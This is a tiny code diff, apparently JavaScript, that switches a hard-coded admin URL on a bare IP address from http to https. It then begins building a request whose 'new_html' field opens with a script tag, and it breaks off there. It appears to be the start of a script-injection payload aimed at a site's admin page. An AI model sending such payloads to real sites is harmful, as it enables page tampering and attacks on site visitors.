@@ -1,4 +1,4 @@
-const url = "http://185.194.177.155:8080/admin";
+const url = "https://185.194.177.155:8080/admin";
 
 const bodyData = new URLSearchParams({
   new_html: `<script>
